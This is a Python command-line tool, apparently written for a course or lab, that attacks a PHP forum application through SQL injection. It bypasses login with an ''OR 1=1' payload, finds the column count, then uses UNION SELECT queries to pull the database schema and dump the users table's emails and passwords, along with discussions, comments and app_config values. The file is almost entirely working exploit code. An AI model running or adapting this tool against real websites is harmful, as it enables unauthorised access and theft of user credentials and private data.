#Ming Hong - 2201741782

import requests as req
from bs4 import BeautifulSoup as soup
import sys
import getopt
import hashlib
import time

TARGET = ""
URL = ""
DATABASE = False
TABLE = False
DUMP = False
COOKIE = ""
SESSION = req.Session()
COLUMN = 0

def bypassAuthentication():
    global TARGET,SESSION,COOKIE
    new_url = 'http://'+TARGET + '/'
    SESSION = req.Session()
    login_response = SESSION.get(new_url)
    login_html = soup(login_response.text,'html.parser')
    csrf_token = login_html.find('input',{'name':'csrf_token'})['value']
    login_action = login_html.find('form')['action']
    payload = {
        'action' : 'login',
        'username' : "'OR 1=1 LIMIT 1#",
        'password' : 'aa',
        'csrf_token' : csrf_token
    }
    response = SESSION.post(new_url+login_action,data = payload)
    print('[*] Try login the website using SQL Injection Attack')
    if(response.url != new_url + 'login.php'):
        print('[+] The website vulnerable to SQL Injection Attack')
        COOKIE = SESSION.cookies['PHPSESSID']
        print('Successfully getting the website authentication with PHPSESSID value {}'.format(COOKIE))
    else:
        print('[-] Failed to get authentication')
    
    print("")


def checkURL():
    global URL,TARGET
    #check if url and target arguments are given or not
    if URL is "" or TARGET is "":
        print("-t/--target or -u/--url argument is required")
        sys.exit(1)
    
    #check html status code
    html_response = SESSION.get('http://'+TARGET + '/' + URL)
    if html_response.status_code!=200:
        print("[-] The requested URL not found")
        sys.exit(1)


def findTotalColumn(url):
    global SESSION
    new_url = url + " ORDER BY {}"
    total_col = 1
    print("[+] Generate total column for union-based SQL Injection Attack")
    print("")
    start = time.time()
    while True:
        format_url = new_url.format(total_col)
        discussion_response = SESSION.get(format_url)
        discussion_html = soup(discussion_response.text,'html.parser')
        discussion_find = discussion_html.find('div',{'class':'box-body'})
        if discussion_find is None :
            return total_col
        total_col +=1
        end = time.time()
        if end - start >10:
            print("[-] Processed for {} seconds and not able to determine the total column".format(end-start))
            print("[-] The target URL is not vulnerable to union-based SQL Injection attack")
            sys.exit(1)
    

def unionPayload(url,total_col):
    new_url = url + " UNION SELECT "
    for i in range(1,total_col):
        new_url = new_url + str(i)
        if(i != total_col-1):
            new_url = new_url + ','
    return new_url
def getDatabase():
    global URL,TARGET,SESSION,COLUMN
    new_url = 'http://'+TARGET + '/' + URL

    #total column needed for union based attack
    if COLUMN == 0:
        COLUMN = findTotalColumn(new_url)
    #print(total_col)
    #union payload
    union_payload = unionPayload(new_url,COLUMN)
    #print(union_payload)

    union_response = SESSION.get(union_payload)
    union_html = soup(union_response.text,'html.parser')

    ##2 is vulnerable
    #union_find = union_html.find('h3')
    #print(union_find)
    
    #get database name
    getDatabaseURL = union_payload.replace('4','DATABASE()')
    getDatabaseURL += ' LIMIT 1 OFFSET 1'
    get_database_response = SESSION.get(getDatabaseURL)
    get_database_html = soup(get_database_response.text,'html.parser')
    find_database_name = get_database_html.find_all('b')[0].text
    print("Database name : {}".format(find_database_name))
    print("===============================================================")

def getTable():
    global URL,TARGET,SESSION,COLUMN
    new_url = 'http://'+TARGET + '/' + URL

    #total column needed for union based attack
    if COLUMN == 0:
        COLUMN = findTotalColumn(new_url)
    #print(total_col)
    #union payload
    union_payload = unionPayload(new_url,COLUMN)
    #print(union_payload)

    union_response = SESSION.get(union_payload)
    union_html = soup(union_response.text,'html.parser')

    ##2 is vulnerable
    #union_find = union_html.find('h3')
    #print(union_find)

    #get table
    getTableURL = union_payload.replace('4','GROUP_CONCAT(TABLE_NAME)')
    getTableURL += " FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= database() LIMIT 1 OFFSET 1"
    get_table_response = SESSION.get(getTableURL)
    get_table_html = soup(get_table_response.text,'html.parser')
    find_all_table =  (get_table_html.find_all('b')[0].text.split(','))
    
    #get table created time
    getTableCreatedTime = union_payload.replace('4','group_concat(create_time)')
    getTableCreatedTime += " FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA= DATABASE() LIMIT 1 OFFSET 1"
    get_table_created_time_response = SESSION.get(getTableCreatedTime)
    get_table_created_time_html = soup(get_table_created_time_response.text,'html.parser')
    find_all_created_time = (get_table_created_time_html.find_all('b')[0].text.split(','))

    #get table and column and table
    get_table_and_datatype = union_payload.replace('4','group_concat(data_type)')
    get_table_and_datatype = get_table_and_datatype.replace('5','group_concat(column_name)')
    get_table_and_datatype= get_table_and_datatype.replace('3','group_concat(table_name)')
    get_table_and_datatype += " FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA= DATABASE() LIMIT 1 OFFSET 1"
    get_table_and_datatype_response = SESSION.get(get_table_and_datatype)
    get_table_and_datatype_html = soup(get_table_and_datatype_response.text,'html.parser')
    find_tables = ((get_table_and_datatype_html.find_all('div')[3].text.split(',')))
    find_data_type = ((get_table_and_datatype_html.find_all('b')[0].text.split(',')))
    find_columns = ((get_table_and_datatype_html.find_all('span')[2].text.split(',')))
    i = 0
    print("Table\t\t Time Created")
    for value in find_all_table:
        print(value,end="   ")
        print("\t {}".format(find_all_created_time[i]))
        i+=1
    print("===============================================================")
    print("Column\t\t\tData Type\t\tTable")
    i = 0
    for value in find_columns:
        print(value,end="       ")
        if i==3:
            print("\t{}".format(find_data_type[i]),end = "   ")
            print("\t\t\t{}".format(find_tables[i]))
        elif i==11:
            print("\t\t{}".format(find_data_type[i]),end = "")
            print("\t\t{}".format(find_tables[i]))
        else:
            print("\t\t{}".format(find_data_type[i]),end = "")
            print("\t\t\t{}".format(find_tables[i]))
        i+=1
    print("===============================================================")

def getData():
    global URL,TARGET,SESSION,COLUMN
    new_url = 'http://'+TARGET + '/' + URL

    #total column needed for union based attack
    if COLUMN == 0:
        COLUMN = findTotalColumn(new_url)
    #print(total_col)
    #union payload
    union_payload = unionPayload(new_url,COLUMN)
    #print(union_payload)

    union_response = SESSION.get(union_payload)
    union_html = soup(union_response.text,'html.parser')

    ##2 is vulnerable
    #union_find = union_html.find('h3')
    #print(union_find)
    #get user_table1
    user_table1 = union_payload.replace('4','group_concat(username)')
    user_table1 = user_table1.replace('5','group_concat(name)')
    user_table1= user_table1.replace('3','group_concat(id)')
    user_table1 += " FROM users LIMIT 1 OFFSET 1"
    user_table1_response = SESSION.get(user_table1)
    user_table1_html = soup(user_table1_response.text,'html.parser')
    find_user_id = ((user_table1_html.find_all('div')[3].text.split(',')))
    find_username = ((user_table1_html.find_all('b')[0].text.split(',')))
    find_name = ((user_table1_html.find_all('span')[2].text.split(',')))

    #get user table2
    user_table2 = union_payload.replace('4','group_concat(email)')
    user_table2 = user_table2.replace('5','group_concat(password)')
    user_table2 += " FROM users LIMIT 1 OFFSET 1"
    user_table2_response = SESSION.get(user_table2)
    user_table2_html = soup(user_table2_response.text,'html.parser')
    find_email = ((user_table2_html.find_all('b')[0].text.split(',')))
    find_password = ((user_table2_html.find_all('span')[2].text.split(',')))
    
    i = 0
    print("Table Name : users")
    for value in find_user_id:
        print("id : {}".format(find_user_id[i]))
        print("username : {}".format(find_username[i]))
        print("name : {}".format(find_name[i]))
        print("email : {}".format(find_email[i]))
        print("password : {}".format(find_password[i]))
        i+=1
    print("===============================================================")
    
    #get topics table
    topics_table = union_payload.replace('4','group_concat(id)')
    topics_table = topics_table.replace('5','group_concat(name)')
    topics_table += " FROM topics LIMIT 1 OFFSET 1"
    topics_table_response = SESSION.get(topics_table)
    topics_table_html = soup(topics_table_response.text,'html.parser')
    find_topics_id = ((topics_table_html.find_all('b')[0].text.split(',')))
    find_topics_name = ((topics_table_html.find_all('span')[2].text.split(',')))
    
    i = 0
    print("Table Name : topics")
    for value in find_topics_id:
        print("id : {}".format(value))
        print("name : {}".format(find_topics_name[i]))
        i+=1
    print("===============================================================")

    #get discussions table1
    discussions_table_1 = union_payload.replace('4','group_concat(id)')
    discussions_table_1 = discussions_table_1.replace('5','group_concat(user_id)')
    discussions_table_1= discussions_table_1.replace('3','group_concat(title)')
    discussions_table_1 += " FROM discussions LIMIT 1 OFFSET 1"
    discussions_table_1_response = SESSION.get(discussions_table_1)
    discussions_table_1_html = soup(discussions_table_1_response.text,'html.parser')
    find_discussions_title = ((discussions_table_1_html.find_all('div')[3].text.split(',')))
    find_discussions_id = ((discussions_table_1_html.find_all('b')[0].text.split(',')))
    find_discussions_user_id = ((discussions_table_1_html.find_all('span')[2].text.split(',')))

    #get discussions table2
    discussions_table_2 = union_payload.replace('4','group_concat(content)')
    discussions_table_2 = discussions_table_2.replace('5','group_concat(topic_id)')
    discussions_table_2= discussions_table_2.replace('3','group_concat(date)')
    discussions_table_2 += " FROM discussions LIMIT 1 OFFSET 1"
    discussions_table_2_response = SESSION.get(discussions_table_2)
    discussions_table_2_html = soup(discussions_table_2_response.text,'html.parser')
    find_discussions_date = ((discussions_table_2_html.find_all('div')[3].text.split(',')))
    find_discussions_content = ((discussions_table_2_html.find_all('b')[0].text.split(',')))
    find_discussions_topic_id = ((discussions_table_2_html.find_all('span')[2].text.split(',')))

    i = 0
    print("Table Name : discussions")
    for value in find_discussions_id:
        print("id : {}".format(value))
        print("user_id : {}".format(find_discussions_user_id[i]))
        print("title : {}".format(find_discussions_title[i]))
        print("content : {}".format(find_discussions_content[i]))
        print("topic_id : {}".format(find_discussions_topic_id[i]))
        print("date : {}".format(find_discussions_date[i]))
        i+=1
    print("===============================================================")

    #get comments table1
    comments_table_1 = union_payload.replace('4','group_concat(id)')
    comments_table_1 = comments_table_1.replace('5','group_concat(discussion_id)')
    comments_table_1= comments_table_1.replace('3','group_concat(user_id)')
    comments_table_1 += " FROM comments LIMIT 1 OFFSET 1"
    comments_table_1_response = SESSION.get(comments_table_1)
    comments_table_1_html = soup(comments_table_1_response.text,'html.parser')
    find_comments_user_id = ((comments_table_1_html.find_all('div')[3].text.split(',')))
    find_comments_id = ((comments_table_1_html.find_all('b')[0].text.split(',')))
    find_comments_discussion_id = ((comments_table_1_html.find_all('span')[2].text.split(',')))

    #get comments table2
    comments_table_2 = union_payload.replace('4','group_concat(comment)')
    comments_table_2 += " FROM comments LIMIT 1 OFFSET 1"
    comments_table_2_response = SESSION.get(comments_table_2)
    comments_table_2_html = soup(comments_table_2_response.text,'html.parser')
    find_comment = ((comments_table_2_html.find_all('b')[0].text.split(',')))
    
    i = 0
    print("Table Name : comments")
    for value in find_comments_id:
        print("id : {}".format(value))
        print("discussion_id : {}".format(find_comments_discussion_id[i]))
        print("user_id : {}".format(find_comments_user_id[i]))
        print("comment : {}".format(find_comment[i]))
        i+=1
    print("===============================================================")

    
    #get app_config table

    #don't know why cannot get key 
    #app_config_table = union_payload.replace('4','group_concat(key)')

    app_config_table = union_payload.replace('5','group_concat(value)')
    app_config_table += " FROM app_config LIMIT 1 OFFSET 1"
    app_config_table_response = SESSION.get(app_config_table)
    app_config_table_html = soup(app_config_table_response.text,'html.parser')
    #find_app_config_key = ((app_config_table_html.find_all('b')[0].text.split(',')))
    find_app_config_value = ((app_config_table_html.find_all('span')[2].text.split(',')))
    
    i = 0
    print("Table Name : app_config")
    for value in find_app_config_value:
        #print("key : {}".format(value))
        print("value : {}".format(find_app_config_value[i]))
        i+=1
    print("===============================================================")

def help():
    print("Usage: beo.py [-t/--target IP_ADDRESS/DNS] [-u/--url URL] [OPTIONS]")
    print("")
    print("  -h, --help\t\t\t\t\t\tShow basic help message and exit")
    print("  -t IP_ADDRESS/DNS, --target=IP_ADDRESS/DNS\t\tSet IP Address or DNS (e.g 127.0.0.1)")
    print("  -u URL, --url=URL\t\t\t\t\tSet Website URL (e.g. web/index.php?id=1)")
    print("")
    print("Options:")
    print("")
    print("  --db\t\t\t\t\t\t\tShow the current database name")
    print("  --tc\t\t\t\t\t\t\tShow all tables name, table create time and columns from the current database")
    print("  --dump\t\t\t\t\t\tShow all table name and entries data from the current database")
    print("")
    print("Example:")
    print("")
    print("beo.py -h")
    print("beo.py --help")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --db")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --db")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --tc")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --tc")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --dump")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --dump")
    print("beo.py -t 127.0.0.1 -u web/index.php?id=1 --db --tc --dump")
    print("beo.py --target=127.0.0.1 --url=web/index.php?id=1 --db --tc --dump")

def main():
    global TARGET,URL,DATABASE,TABLE,DUMP,COOKIE
    if(len(sys.argv)==1):
        help()

    #get user's input
    try:
        opts, _ = getopt.getopt(sys.argv[1:],"t:u:h",['target=','url=','help','db','tc','dump'])
    except getopt.GetoptError:
        help()
    for key,value in opts:
        if key == '-t' or key =='--target':
            TARGET = value
        elif key == '-u' or key == '--url':
            URL = value
        elif key == '-h' or key =='--help':
            help()
            sys.exit(1)
        elif key=='--db':
            DATABASE = True
        elif key =='--tc':
            TABLE = True
        elif key =='--dump':
            DUMP = True

    if(TARGET or URL):
        checkURL()

    if(DATABASE and TABLE and DUMP):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getDatabase()
        getTable()
        getData()
    elif(DATABASE and TABLE):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getDatabase()
        getTable()
    elif(DATABASE and DUMP):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getDatabase()
        getData()
    elif(TABLE and DUMP):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getTable()
        getData()
    elif(DATABASE):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getDatabase()
    elif(TABLE):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getTable()
    elif(DUMP):
        checkURL()
        if COOKIE == "":
            bypassAuthentication() 
        getData()


if __name__ == "__main__":
    main()